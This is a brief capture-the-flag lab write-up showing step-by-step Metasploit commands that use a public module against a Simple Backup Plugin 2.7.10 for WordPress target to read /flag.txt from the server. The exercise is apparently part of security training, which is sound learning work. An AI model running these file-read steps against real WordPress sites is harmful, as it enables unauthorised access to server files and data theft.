First hack with Metasploit
Q: Try to identify the services running on the server above, and then try to search to find public exploits to exploit them. Once you do, try to get the content of the '/flag.txt' file. (note: the web server may take a few seconds to start)

I first open up the target in my browser to see what we are working with. I meet a webpage displaying the text "Simple Backup Plugin 2.7.10 for WordPress".

I search up "simple backup" on Metasploit to see if I get any hits on it. The rest I will show is the commands to this hack.

msf6 > search simple backup

msf6 > use 0

msf6 > options

msf6 > set RHOST *ip-adress

msf6 > set RPORT *port

*this is because the question is asking us to try and get the content of the /flag.txt

msf6 > set FILEPATH /flag.txt

msf6 > run

cd /home/kali/.msf4/loot

ls

cat *file that you have displayed with the ls command

And there you have your flag. Your first hack
